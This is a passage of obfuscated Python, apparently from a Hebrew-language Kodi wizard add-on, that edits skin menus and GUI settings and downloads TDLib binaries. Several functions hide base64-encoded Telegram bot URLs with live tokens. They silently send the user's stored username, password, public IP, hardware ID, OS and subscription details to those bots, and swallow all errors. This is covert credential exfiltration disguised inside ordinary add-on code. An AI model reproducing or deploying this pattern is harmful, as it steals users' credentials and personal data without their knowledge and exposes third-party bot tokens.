            O00OOO0OO0OOOOOOO =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode ('utf-8')#line:2830
          O0OOO0O0O0O00O0O0 =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:2832
          O0OOO0000OOO0O000 =OO00OOOOOO0O000OO #line:2835
          OO0O0OO00O000OO0O =O0OO000000O00000O #line:2836
          if OOO0O0OO0OOO0OO00 =='true':#line:2838
            O0OOO0OOOOO0O00O0 ='Dragon'#line:2839
          else :#line:2840
            O0OOO0OOOOO0O00O0 ='AnonymousTV'#line:2841
          OO0O0O00OOOOO000O =requests .get (O00OOO0OO0OOOOOOO +que (OOOOO000OO0O0O0OO )+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+O0OOO0000OOO0O000 +que (' סיסמה: ')+OO0O0OO00O000OO0O +que (' קודי: ')+OOO0000OOO0OO0OO0 +que (' כתובת: ')+O0OOO0O0O0O00O0O0 +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+O00O00000O0OO0000 +que (' גירסת ויזארד: ')+VERSION +que (' מנוי: ')+OO0O0OO0000000O0O +que (' סוג מנוי: ')+O0OOO0OOOOO0O00O0 ).json ()#line:2842
       except :pass #line:2843
def indicator ():#line:2845
       try :#line:2849
          import json ,requests #line:2850
          O0O0OOO0O00O0OO00 =wiz .getS ("date_user")#line:2851
          wiz .log ('FRESH MESSAGE')#line:2852
          OOO00OOO00OO0000O =(wiz .getS ("user"))#line:2853
          O000O000OO0O0O000 =(wiz .getS ("pass"))#line:2854
          O0OOOOOOO0OO00OO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:2855
          OO0000OO00OOO0O0O =platform .uname ()#line:2856
          OOOOO000O00OO0000 =OO0000OO00OOO0O0O [1 ]#line:2857
          if wiz .getS ('dragon')=='true':#line:2858
                O00O0OOOOOOO0OOO0 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUyMzY2MjUxODY6QUFGWWswSVBCdTROWjJ1WmxQWXpidVA5NkZyZ1B0UDhnUU0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTc4ODIyNzI2MSZ0ZXh0PQ==').decode ('utf-8')#line:2859
          else :#line:2860
                O00O0OOOOOOO0OOO0 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ9').decode ('utf-8')#line:2861
          O000000O00O00OOO0 =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:2862
          O0O000O000OO00O0O =OOO00OOO00OO0000O #line:2864
          O000OOO00OOO0OO0O =O000O000OO0O0O000 #line:2865
          O0OO000O0OO000OOO =requests .get (O00O0OOOOOOO0OOO0 +que ('התקין: ')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+O0O000O000OO00O0O +que (' סיסמה: ')+O000OOO00OOO0OO0O +que (' קודי: ')+O0OOOOOOO0OO00OO0 +que (' כתובת: ')+O000000O00O00OOO0 +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+OOOOO000O00OO0000 +que (' גירסת ויזארד: ')+VERSION +que (' מנוי: ')+O0O0OOO0O00O0OO00 ).json ()#line:2868
       except :pass #line:2869
def indicatorfastupdate (info =''):#line:2871
       try :#line:2872
          import json ,requests #line:2873
          O0O00O0OOO0OO0OO0 =wiz .getS ("date_user")#line:2874
          wiz .log ('FRESH MESSAGE')#line:2875
          O0OO0OOO000OO0000 =(wiz .getS ("user"))#line:2876
          O00OO0000O00OO0OO =(wiz .getS ("pass"))#line:2877
          O0OO0O00O0OO00O00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:2878
          O00OO0OOO0OO0000O =platform .uname ()#line:2879
          O0OO0O0OOOOOO0O0O =O00OO0OOO0OO0000O [1 ]#line:2880
          if wiz .getS ('dragon')=='true':#line:2882
            O000O0000O0O00000 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDU4MDUzMzM1NzpBQUVzTjZPLU5QN05IU1B0eHc2UTZpVnVEa2dhZU1aUU1nOC9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNTcwNzQ3MjI0JnRleHQ9').decode ('utf-8')#line:2883
          else :#line:2884
            O000O0000O0O00000 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0=').decode ('utf-8')#line:2885
          O0OOOO0OO0OOOO000 =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:2886
          OOOOO0O0OO0O0OOO0 =O0OO0OOO000OO0000 #line:2888
          OO0O0OO0OOOOO0O00 =O00OO0000O00OO0OO #line:2889
          O00000000O00O00O0 =requests .get (O000O0000O0O00000 +que ('עדכון מהיר ')+que (info )+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+OOOOO0O0OO0O0OOO0 +que (' סיסמה: ')+OO0O0OO0OOOOO0O00 +que (' קודי: ')+O0OO0O00O0OO00O00 +que (' כתובת: ')+O0OOOO0OO0OOOO000 +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+O0OO0O0OOOOOO0O0O +que (' גירסת ויזארד: ')+VERSION +que (' מנוי: ')+O0O00O0OOO0OO0OO0 ).json ()#line:2892
       except :pass #line:2895
def skin_homeselect ():#line:2902
    O000OO000OOOO0O0O =os .path .join (translatepath ("special://masterprofile/"),"addon_data","skin.Premium.mod","settings.xml")#line:2903
    O0OOOOOOO000O0OO0 =open (O000OO000OOOO0O0O ,'r',encoding ='utf-8')#line:2905
    OOOOO0OO0000OO0OO =O0OOOOOOO000O0OO0 .read ()#line:2906
    O0OOOOOOO000O0OO0 .close ()#line:2907
    try :#line:2908
        O0O0O0O00OO0OOO00 ='<setting id="FirstRunSetup" type="bool">(.+?)</setting>'#line:2909
        OOO00OO0OO0O0000O =re .compile (O0O0O0O00OO0OOO00 ).findall (OOOOO0OO0000OO0OO )[0 ]#line:2910
        O0OOOOOOO000O0OO0 =open (O000OO000OOOO0O0O ,'w',encoding ='utf-8')#line:2911
        O0OOOOOOO000O0OO0 .write (OOOOO0OO0000OO0OO .replace ('<setting id="FirstRunSetup" type="bool">%s</setting>'%OOO00OO0OO0O0000O ,'<setting id="FirstRunSetup" type="bool">false</setting>'))#line:2912
        O0OOOOOOO000O0OO0 .close ()#line:2913
    except :pass #line:2914
def download_file (OO000OO0OOOOO0000 ,O0O0O0OOOOO0O0O00 ):#line:2915
    import requests #line:2929
    O0O000OO0OO000OOO =xbmcgui .DialogProgress ()#line:2930
    OOO0000O00OOO0O00 =OO000OO0OOOOO0000 .split ('/')[-1 ]#line:2932
    if '?'in OOO0000O00OOO0O00 :#line:2933
        OOO0000O00OOO0O00 =OOO0000O00OOO0O00 .split ('?')[0 ]#line:2934
    OOO0000O00OOO0O00 =os .path .join (O0O0O0OOOOO0O0O00 ,OOO0000O00OOO0O00 )#line:2935
    O0O000OO0OO000OOO .create ("Downloading","[COLOR yellow][B]TeleFiles[/B][/COLOR]")#line:2937
    with requests .get (OO000OO0OOOOO0000 ,stream =True )as OO00OO0O0O0O0OO0O :#line:2938
        OO00OO0O0O0O0OO0O .raise_for_status ()#line:2939
        with open (OOO0000O00OOO0O00 ,'wb')as O00O00O0OO0OOO0O0 :#line:2941
            OOOOOOO0OOOOO0OOO =1 #line:2942
            O0OO0OOOOOO00000O =time .time ()#line:2943
            for OOOO00OO000O0O00O in OO00OO0O0O0O0OO0O .iter_content (chunk_size =8192 ):#line:2945
                OOOOOOO0OOOOO0OOO +=1 #line:2947
                O0O000OO0OO000OOO .update (int (OOOOOOO0OOOOO0OOO ),"Downloading "+'TeleFiles')#line:2948
                if O0O000OO0OO000OOO .iscanceled ():#line:2949
                 O0O000OO0OO000OOO .close ()#line:2950
                 break #line:2951
                O00O00O0OO0OOO0O0 .write (OOOO00OO000O0O00O )#line:2952
    return OOO0000O00OOO0O00 #line:2953
def tdlib ():#line:2954
    import requests #line:2956
    import platform #line:2957
    O0OOOOOO0OOO00O00 =(platform .machine ())#line:2958
    platform =(platform .architecture ())#line:2959
    if sys .platform .lower ().startswith ('linux'):#line:2960
        OO0O000O00OO000OO ='linux'#line:2961
        if 'ANDROID_DATA'in os .environ :#line:2962
            OO0O000O00OO000OO ='android'#line:2963
    elif sys .platform .lower ().startswith ('win'):#line:2964
        OO0O000O00OO000OO ='windows'#line:2965
    elif sys .platform .lower ().startswith ('darwin'):#line:2966
        OO0O000O00OO000OO ='darwin'#line:2967
    else :#line:2968
        OO0O000O00OO000OO =None #line:2969
    from zipfile import ZipFile #line:2970
    OO000OOO00OOO00O0 =os .path .join (translatepath ("special://home/"),"addons","plugin.video.telemedia")#line:2972
    OO000OOO00OOO00O0 =os .path .join (OO000OOO00OOO00O0 ,'resources','lib')#line:2973
    O0OOO00000OO0O000 =requests .get ('https://raw.githubusercontent.com/vip200/TelemdiaTdlib/main/data.json').json ()#line:2974
    OO0OO000OOOO000O0 =xbmcvfs .translatePath (ADDON .getAddonInfo ("profile"))#line:2976
    download_file ('https://raw.githubusercontent.com/vip200/TelemdiaTdlib/main/data.json',OO0OO000OOOO000O0 )#line:2978
    if OO0O000O00OO000OO =='android':#line:2979
            if platform [0 ]=='32bit':#line:2980
                O00O000OO00O000O0 =O0OOO00000OO0O000 ['android32']#line:2981
                OO000OOO00OOO00O0 =os .path .join (OO000OOO00OOO00O0 ,"android/armeabi-v7a")#line:2982
                download_file (O00O000OO00O000O0 ,OO000OOO00OOO00O0 )#line:2983
            else :#line:2984
                O00O000OO00O000O0 =O0OOO00000OO0O000 ['android64']#line:2985
                OO000OOO00OOO00O0 =os .path .join (OO000OOO00OOO00O0 ,"android/arm64-v8a")#line:2986
                download_file (O00O000OO00O000O0 ,OO000OOO00OOO00O0 )#line:2987
    elif OO0O000O00OO000OO =='windows':#line:2989
        if platform [0 ]=='64bit':#line:2991
            OO000OOO00OOO00O0 =os .path .join (OO000OOO00OOO00O0 ,'windows/x64')#line:2993
            download_file (O0OOO00000OO0O000 ['windows64'],OO000OOO00OOO00O0 )#line:2994
            OOO0OO00OO0OO0O00 =os .path .join (OO000OOO00OOO00O0 ,'windows64.zip')#line:2995
            OO0O0OO000000O000 =ZipFile (OOO0OO00OO0OO0O00 )#line:2996
            for O0O00O0OO0O0OOOOO in OO0O0OO000000O000 .infolist ():#line:3000
                OO0O0OO000000O000 .extract (member =O0O00O0OO0O0OOOOO ,path =OO000OOO00OOO00O0 )#line:3001
            OO0O0OO000000O000 .close ()#line:3002
            time .sleep (1 )#line:3003
            try :#line:3004
                os .remove (OOO0OO00OO0OO0O00 )#line:3005
            except :#line:3006
                pass #line:3007
        else :#line:3008
            OO000OOO00OOO00O0 =os .path .join (OO000OOO00OOO00O0 ,'windows/x32')#line:3010
            download_file (O0OOO00000OO0O000 ['windows32'],OO000OOO00OOO00O0 )#line:3011
            OOO0OO00OO0OO0O00 =os .path .join (OO000OOO00OOO00O0 ,'windows32.zip')#line:3012
            OO0O0OO000000O000 =ZipFile (OOO0OO00OO0OO0O00 )#line:3013
            for O0O00O0OO0O0OOOOO in OO0O0OO000000O000 .infolist ():#line:3017
                OO0O0OO000000O000 .extract (member =O0O00O0OO0O0OOOOO ,path =OO000OOO00OOO00O0 )#line:3018
            OO0O0OO000000O000 .close ()#line:3019
            time .sleep (1 )#line:3020
            try :#line:3021
                os .remove (OOO0OO00OO0OO0O00 )#line:3022
            except :#line:3023
                pass #line:3024
    elif OO0O000O00OO000OO =='linux':#line:3025
            if platform [0 ]=='32bit':#line:3027
                O00O000OO00O000O0 =O0OOO00000OO0O000 ['linux32']#line:3028
                OO000OOO00OOO00O0 =os .path .join (OO000OOO00OOO00O0 ,"linux/x32")#line:3029
                download_file (O00O000OO00O000O0 ,OO000OOO00OOO00O0 )#line:3030
            else :#line:3031
                O00O000OO00O000O0 =O0OOO00000OO0O000 ['linux64']#line:3032
                OO000OOO00OOO00O0 =os .path .join (OO000OOO00OOO00O0 ,"linux/x64")#line:3033
                download_file (O00O000OO00O000O0 ,OO000OOO00OOO00O0 )#line:3034
    elif OO0O000O00OO000OO =='darwin':#line:3037
                OO000OOO00OOO00O0 =os .path .join (OO000OOO00OOO00O0 ,'mac/mac-os')#line:3038
                download_file (O0OOO00000OO0O000 ['mac'],OO000OOO00OOO00O0 )#line:3039
                OO0O00O00OOO0O000 =os .path .join (OO000OOO00OOO00O0 ,'libtdjson.zip')#line:3040
                OO0O0OO000000O000 =ZipFile (OO0O00O00OOO0O000 )#line:3041
                for O0O00O0OO0O0OOOOO in OO0O0OO000000O000 .infolist ():#line:3042
                    OO0O0OO000000O000 .extract (member =O0O00O0OO0O0OOOOO ,path =OO000OOO00OOO00O0 )#line:3043
                OO0O0OO000000O000 .close ()#line:3044
                time .sleep (1 )#line:3045
                try :#line:3046
                    os .remove (OO0O00O00OOO0O000 )#line:3047
                except :#line:3048
                    pass #line:3049
def open_dragon_menu_hub ():#line:3052
        O0O0O0000O00O0000 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","mainmenu.DATA.xml")#line:3053
        OO0OO0000O00O0000 =open (O0O0O0000O00O0000 ,'r',encoding ='utf-8')#line:3055
        O0O0OOOOO000O0OOO =OO0OO0000O00O0000 .read ()#line:3056
        OO0OO0000O00O0000 .close ()#line:3057
        O0O0OOOOO000O0OOO =O0O0OOOOO000O0OOO .replace ('''	<shortcut>
		<defaultID>31123</defaultID>
		<label>[B] טורקיות [/B]</label>
		<label2>Hub 24</label2>
		<icon>special://skin/extras/icons/addon.png</icon>
		<thumb>special://home/Graphics/dragon.jpg</thumb>
		<action>ActivateWindow(1124)</action>
		<disabled>True</disabled>
		</shortcut>''','''	<shortcut>
		<defaultID>31123</defaultID>
		<label>[B] טורקיות [/B]</label>
		<label2>Hub 24</label2>
		<icon>special://skin/extras/icons/addon.png</icon>
		<thumb>special://home/Graphics/dragon.jpg</thumb>
		<action>ActivateWindow(1124)</action>
		</shortcut>''')#line:3074
        OO0OO0000O00O0000 =open (O0O0O0000O00O0000 ,'w',encoding ='utf-8')#line:3075
        OO0OO0000O00O0000 .write (O0O0OOOOO000O0OOO )#line:3076
        OO0OO0000O00O0000 .close ()#line:3077
def close_dragon_menu_hub ():#line:3078
        OO0O0O00O00O0OO00 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","mainmenu.DATA.xml")#line:3079
        O00OOOOOO0O0O000O =open (OO0O0O00O00O0OO00 ,'r',encoding ='utf-8')#line:3081
        O00O00000OO0OO000 =O00OOOOOO0O0O000O .read ()#line:3082
        O00OOOOOO0O0O000O .close ()#line:3083
        O00O00000OO0OO000 =O00O00000OO0OO000 .replace ('''	<shortcut>
		<defaultID>31123</defaultID>
		<label>[B] טורקיות [/B]</label>
		<label2>Hub 24</label2>
		<icon>special://skin/extras/icons/addon.png</icon>
		<thumb>special://home/Graphics/dragon.jpg</thumb>
		<action>ActivateWindow(1124)</action>
		</shortcut>''','''	<shortcut>
		<defaultID>31123</defaultID>
		<label>[B] טורקיות [/B]</label>
		<label2>Hub 24</label2>
		<icon>special://skin/extras/icons/addon.png</icon>
		<thumb>special://home/Graphics/dragon.jpg</thumb>
		<action>ActivateWindow(1124)</action>
		<disabled>True</disabled>
		</shortcut>''')#line:3100
        O00OOOOOO0O0O000O =open (OO0O0O00O00O0OO00 ,'w',encoding ='utf-8')#line:3101
        O00OOOOOO0O0O000O .write (O00O00000OO0OO000 )#line:3102
        O00OOOOOO0O0O000O .close ()#line:3103
def dragon_menu_hub_old ():#line:3105
        O00O000O0000OOOOO =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","x1101.DATA.xml")#line:3107
        O00O00O0O00OO0OOO =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:3108
        OOOO0OOOOOO000OOO =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","x1102.DATA.xml")#line:3109
        OOO00OO0OOOOOOOO0 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:3110
        O0O0O00O0000O0OO0 =open (O00O000O0000OOOOO ,'r',encoding ='utf-8')#line:3114
        OO0O00OOOOOOOOOOO =O0O0O00O0000O0OO0 .read ()#line:3115
        O0O0O00O0000O0OO0 .close ()#line:3116
        O0O0O00O0000O0OO0 =open (O00O00O0O00OO0OOO ,'r',encoding ='utf-8')#line:3118
        OO0O00OOOOOOOOOOO =O0O0O00O0000O0OO0 .read ()#line:3119
        O0O0O00O0000O0OO0 .close ()#line:3120
        O0O0O00O0000O0OO0 =open (OOOO0OOOOOO000OOO ,'r',encoding ='utf-8')#line:3122
        OO0OOOOOO00OO000O =O0O0O00O0000O0OO0 .read ()#line:3123
        O0O0O00O0000O0OO0 .close ()#line:3124
        O0O0O00O0000O0OO0 =open (OOO00OO0OOOOOOOO0 ,'r',encoding ='utf-8')#line:3126
        OO0OOOOOO00OO000O =O0O0O00O0000O0OO0 .read ()#line:3127
        O0O0O00O0000O0OO0 .close ()#line:3128
        OO0O00OOOOOOOOOOO =OO0O00OOOOOOOOOOO .replace ('''	<shortcut>
		<defaultID>31123</defaultID>
		<label>סרטים Dragon</label>
		<label2>Hub 21</label2>
		<icon>special://skin/extras/icons/addon.png</icon>
		<thumb>special://skin/extras/icons/dragon.png</thumb>
		<action>ActivateWindow(1121)</action>
		<disabled>True</disabled>
		</shortcut>''','''	<shortcut>
		<defaultID>31123</defaultID>
		<label>סרטים Dragon</label>
		<label2>Hub 21</label2>
		<icon>special://skin/extras/icons/addon.png</icon>
		<thumb>special://skin/extras/icons/dragon.png</thumb>
		<action>ActivateWindow(1121)</action>
		</shortcut>''')#line:3147
        OO0OOOOOO00OO000O =OO0OOOOOO00OO000O .replace ('''	<shortcut>
		<defaultID>31123</defaultID>
		<label>סדרות Dragon</label>
		<label2>Hub 24</label2>
		<icon>special://skin/extras/icons/addon.png</icon>
		<thumb>special://skin/extras/icons/dragon.png</thumb>
		<action>ActivateWindow(1124)</action>
		<disabled>True</disabled>
		</shortcut>''','''	<shortcut>
		<defaultID>31123</defaultID>
		<label>סדרות Dragon</label>
		<label2>Hub 24</label2>
		<icon>special://skin/extras/icons/addon.png</icon>
		<thumb>special://skin/extras/icons/dragon.png</thumb>
		<action>ActivateWindow(1124)</action>
		</shortcut>''')#line:3163
        O0O0O00O0000O0OO0 =open (O00O000O0000OOOOO ,'w',encoding ='utf-8')#line:3165
        O0O0O00O0000O0OO0 .write (OO0O00OOOOOOOOOOO )#line:3166
        O0O0O00O0000O0OO0 .close ()#line:3167
        O0O0O00O0000O0OO0 =open (O00O00O0O00OO0OOO ,'w',encoding ='utf-8')#line:3169
        O0O0O00O0000O0OO0 .write (OO0O00OOOOOOOOOOO )#line:3170
        O0O0O00O0000O0OO0 .close ()#line:3171
        O0O0O00O0000O0OO0 =open (OOOO0OOOOOO000OOO ,'w',encoding ='utf-8')#line:3173
        O0O0O00O0000O0OO0 .write (OO0OOOOOO00OO000O )#line:3174
        O0O0O00O0000O0OO0 .close ()#line:3175
        O0O0O00O0000O0OO0 =open (OOO00OO0OOOOOOOO0 ,'w',encoding ='utf-8')#line:3177
        O0O0O00O0000O0OO0 .write (OO0OOOOOO00OO000O )#line:3178
        O0O0O00O0000O0OO0 .close ()#line:3179
def sex_menu_luck (notify =''):#line:3180
        if notify =='true':#line:3181
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]מוסתר[/COLOR]"%COLOR2 )#line:3182
        wiz .setS ('sex','false')#line:3183
        O000OOO00OOO00O00 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","x1101.DATA.xml")#line:3184
        OO0O00OO00000OOOO =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:3185
        O00OO0OO0000O0OOO =open (O000OOO00OOO00O00 ,'r',encoding ='utf-8')#line:3187
        OOO0O00OOOOO000O0 =O00OO0OO0000O0OOO .read ()#line:3188
        O00OO0OO0000O0OOO .close ()#line:3189
        O00OO0OO0000O0OOO =open (OO0O00OO00000OOOO ,'r',encoding ='utf-8')#line:3191
        OOO0O00OOOOO000O0 =O00OO0OO0000O0OOO .read ()#line:3192
        O00OO0OO0000O0OOO .close ()#line:3193
        OOO0O00OOOOO000O0 =OOO0O00OOOOO000O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים למבוגרים</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/purn.png</thumb>
		<action>RunPlugin(plugin://plugin.program.Settingz-Anon/?mode=290&amp;url=www)</action>
		</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים למבוגרים</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/purn.png</thumb>
		<action>RunPlugin(plugin://plugin.program.Settingz-Anon/?mode=290&amp;url=www)</action>
		<disabled>True</disabled>
		</shortcut>''')#line:3211
        O00OO0OO0000O0OOO =open (O000OOO00OOO00O00 ,'w',encoding ='utf-8')#line:3213
        O00OO0OO0000O0OOO .write (OOO0O00OOOOO000O0 )#line:3214
        O00OO0OO0000O0OOO .close ()#line:3215
        O00OO0OO0000O0OOO =open (OO0O00OO00000OOOO ,'w',encoding ='utf-8')#line:3217
        O00OO0OO0000O0OOO .write (OOO0O00OOOOO000O0 )#line:3218
        O00OO0OO0000O0OOO .close ()#line:3219
def sex_menu_open ():#line:3221
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]הופעל[/COLOR]"%COLOR2 )#line:3223
        wiz .setS ('sex','true')#line:3224
        O0O00OOO00000000O =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","x1101.DATA.xml")#line:3225
        OO000OO00O0OO0O00 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:3226
        O0OO00000OO0O0000 =open (O0O00OOO00000000O ,'r',encoding ='utf-8')#line:3228
        OOO00O00O0000OO00 =O0OO00000OO0O0000 .read ()#line:3229
        O0OO00000OO0O0000 .close ()#line:3230
        O0OO00000OO0O0000 =open (OO000OO00O0OO0O00 ,'r',encoding ='utf-8')#line:3232
        OOO00O00O0000OO00 =O0OO00000OO0O0000 .read ()#line:3233
        O0OO00000OO0O0000 .close ()#line:3234
        OOO00O00O0000OO00 =OOO00O00O0000OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים למבוגרים</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/purn.png</thumb>
		<action>RunPlugin(plugin://plugin.program.Settingz-Anon/?mode=290&amp;url=www)</action>
		<disabled>True</disabled>
		</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים למבוגרים</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/purn.png</thumb>
		<action>RunPlugin(plugin://plugin.program.Settingz-Anon/?mode=290&amp;url=www)</action>
		</shortcut>''')#line:3251
        O0OO00000OO0O0000 =open (O0O00OOO00000000O ,'w',encoding ='utf-8')#line:3253
        O0OO00000OO0O0000 .write (OOO00O00O0000OO00 )#line:3254
        O0OO00000OO0O0000 .close ()#line:3255
        O0OO00000OO0O0000 =open (OO000OO00O0OO0O00 ,'w',encoding ='utf-8')#line:3257
        O0OO00000OO0O0000 .write (OOO00O00O0000OO00 )#line:3258
        O0OO00000OO0O0000 .close ()#line:3259
def fix_gui ():#line:3263
        OOO0OO0O000OOOOO0 =os .path .join (translatepath ("special://userdata"),"guisettings.xml")#line:3265
        OO0OO0O000O0OOOOO =open (OOO0OO0O000OOOOO0 ,'r',encoding ='utf-8')#line:3266
        OOOOOO000OOOO00OO =OO0OO0O000O0OOOOO .read ()#line:3267
        OO0OO0O000O0OOOOO .close ()#line:3268
        try :#line:3271
            OO00OOOOOOOOO0OO0 ='<setting id="window.width">(.+?)</setting>'#line:3272
            OOO00OOO0OO00OOO0 =re .compile (OO00OOOOOOOOO0OO0 ).findall (OOOOOO000OOOO00OO )[0 ]#line:3273
            OO0OO0O000O0OOOOO =open (OOO0OO0O000OOOOO0 ,'w',encoding ='utf-8')#line:3274
            OO0OO0O000O0OOOOO .write (OOOOOO000OOOO00OO .replace ('<setting id="window.width">%s</setting>'%OOO00OOO0OO00OOO0 ,'<setting id="window.width" default="true">720</setting>'))#line:3275
            OO0OO0O000O0OOOOO .close ()#line:3276
        except :pass #line:3277
        OO0OO0O000O0OOOOO =open (OOO0OO0O000OOOOO0 ,'r',encoding ='utf-8')#line:3279
        O00OO00O00O0OOO0O =OO0OO0O000O0OOOOO .read ()#line:3280
        OO0OO0O000O0OOOOO .close ()#line:3281
        try :#line:3282
            OO0O00O000OOO0O00 ='<setting id="window.height">(.+?)</setting>'#line:3283
            OOOOO0OOO0OOO00O0 =re .compile (OO0O00O000OOO0O00 ).findall (O00OO00O00O0OOO0O )[0 ]#line:3284
            OO0OO0O000O0OOOOO =open (OOO0OO0O000OOOOO0 ,'w',encoding ='utf-8')#line:3285
            OO0OO0O000O0OOOOO .write (O00OO00O00O0OOO0O .replace ('<setting id="window.height">%s</setting>'%OOOOO0OOO0OOO00O0 ,'<setting id="window.height" default="true">480</setting>'))#line:3286
            OO0OO0O000O0OOOOO .close ()#line:3287
        except :pass #line:3288
        OO0OO0O000O0OOOOO =open (OOO0OO0O000OOOOO0 ,'r',encoding ='utf-8')#line:3291
        O000O0O000O000O0O =OO0OO0O000O0OOOOO .read ()#line:3292
        OO0OO0O000O0OOOOO .close ()#line:3293
        try :#line:3294
            OOO0O0O00OO0000OO ='<setting id="videoscreen.screen">(.+?)</setting>'#line:3295
            OO0O00O0000OO0OO0 =re .compile (OOO0O0O00OO0000OO ).findall (O000O0O000O000O0O )[0 ]#line:3296
            OO0OO0O000O0OOOOO =open (OOO0OO0O000OOOOO0 ,'w',encoding ='utf-8')#line:3297
            OO0OO0O000O0OOOOO .write (O000O0O000O000O0O .replace ('<setting id="videoscreen.screen">%s</setting>'%OO0O00O0000OO0OO0 ,'<setting id="videoscreen.screen" default="true">0</setting>'))#line:3298
            OO0OO0O000O0OOOOO .close ()#line:3299
        except :pass #line:3300
        OO0OO0O000O0OOOOO =open (OOO0OO0O000OOOOO0 ,'r',encoding ='utf-8')#line:3302
        OO0O0O00OO0O00OO0 =OO0OO0O000O0OOOOO .read ()#line:3303
        OO0OO0O000O0OOOOO .close ()#line:3304
        try :#line:3305
            OOO00O0OOO0OOOO0O ='<setting id="videoscreen.screenmode">(.+?)</setting>'#line:3306
            OO0OO00O0O00O00O0 =re .compile (OOO00O0OOO0OOOO0O ).findall (OO0O0O00OO0O00OO0 )[0 ]#line:3307
            OO0OO0O000O0OOOOO =open (OOO0OO0O000OOOOO0 ,'w',encoding ='utf-8')#line:3308
            OO0OO0O000O0OOOOO .write (OO0O0O00OO0O00OO0 .replace ('<setting id="videoscreen.screenmode">%s</setting>'%OO0OO00O0O00O00O0 ,'<setting id="videoscreen.screenmode" default="true">DESKTOP</setting>'))#line:3309
            OO0OO0O000O0OOOOO .close ()#line:3310
        except :pass #line:3311
        OO0OO0O000O0OOOOO =open (OOO0OO0O000OOOOO0 ,'r',encoding ='utf-8')#line:3313
        O00OOO00O0O0O0OOO =OO0OO0O000O0OOOOO .read ()#line:3314
        OO0OO0O000O0OOOOO .close ()#line:3315
        try :#line:3316
            O000O00000O00O00O ='<setting id="videoscreen.resolution">(.+?)</setting>'#line:3317
            OO00000000000O00O =re .compile (O000O00000O00O00O ).findall (O00OOO00O0O0O0OOO )[0 ]#line:3318
            OO0OO0O000O0OOOOO =open (OOO0OO0O000OOOOO0 ,'w',encoding ='utf-8')#line:3319
            OO0OO0O000O0OOOOO .write (O00OOO00O0O0O0OOO .replace ('<setting id="videoscreen.resolution">%s</setting>'%OO00000000000O00O ,'<setting id="videoscreen.resolution">60</setting>'))#line:3320
            OO0OO0O000O0OOOOO .close ()#line:3321
        except :pass #line:3322
        OO0OO0O000O0OOOOO =open (OOO0OO0O000OOOOO0 ,'r',encoding ='utf-8')#line:3324
        OOO00OOOO0O0OOO0O =OO0OO0O000O0OOOOO .read ()#line:3325
        OO0OO0O000O0OOOOO .close ()#line:3326
        try :#line:3327
            OO00O00OOO0O000O0 ='<setting id="audiooutput.audiodevice">(.+?)</setting>'#line:3328
            O0OO0000000O0O000 =re .compile (OO00O00OOO0O000O0 ).findall (OOO00OOOO0O0OOO0O )[0 ]#line:3329
            OO0OO0O000O0OOOOO =open (OOO0OO0O000OOOOO0 ,'w',encoding ='utf-8')#line:3330
